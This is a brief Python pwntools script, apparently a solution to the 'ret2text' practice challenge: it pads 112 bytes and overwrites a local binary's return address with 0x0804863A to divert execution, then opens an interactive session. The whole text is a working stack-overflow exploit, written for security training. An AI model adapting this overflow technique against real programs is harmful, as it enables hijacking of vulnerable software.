from pwn import *


success_adr=0x0804863A
sh=process('./ret2text')
payload=b'i'*112+p32(success_adr)
sh.sendline(payload)
sh.interactive()
